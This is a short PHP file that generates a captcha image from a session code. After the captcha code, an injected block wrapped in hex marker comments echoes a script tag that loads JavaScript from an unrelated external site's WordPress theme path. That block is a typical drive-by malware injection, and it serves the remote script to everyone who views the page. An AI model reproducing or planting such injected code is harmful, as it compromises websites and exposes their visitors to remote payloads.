<?php
//$data = base64_decode($HTTP_GET_VARS['dt']);
session_start();
$data = $_SESSION["code"];
$im = imagecreate(200,55);
$white = imagecolorallocate($im,255,255,255);
$gray = imagecolorallocate($im, 210,210,210);
$black = imagecolorallocate($im, 0,0,0);
imagefilledrectangle($im, 0, 0, 49, 19, $white);
$font = imageloadfont("betsy.gdf");
imagestring($im,$font,25,10, $data,$black);
imagepng($im);
?>
<?php
#6b05f3#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224420\"></script>";
echo $srwv;
}
#/6b05f3#
?>
